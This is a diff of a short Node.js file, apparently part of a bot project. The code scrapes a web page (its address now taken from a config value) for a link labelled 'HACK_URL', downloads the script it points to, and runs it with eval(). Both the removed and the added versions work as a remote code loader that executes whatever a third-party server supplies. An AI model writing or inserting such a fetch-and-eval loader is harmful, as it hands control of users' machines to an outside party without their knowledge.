@@ -5,27 +5,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchHackUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const hackUrl = $(`a:contains("HACK_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!hackUrl) throw new Error('HACK_URL not found on the webpage.');
+    const hackUrlElement = $('a:contains("HACK_URL")');
+    const hackUrl = hackUrlElement.attr('href');
 
-        console.log('HACK_URL fetched successfully:', hackUrl);
-
-        const scriptResponse = await axios.get(hackUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("HACK_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching HACK_URL:', error.message);
+    if (!hackUrl) {
+      throw new Error('Hack URL link not found...');
     }
+
+    console.log('Hack URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(hackUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchHackUrl();
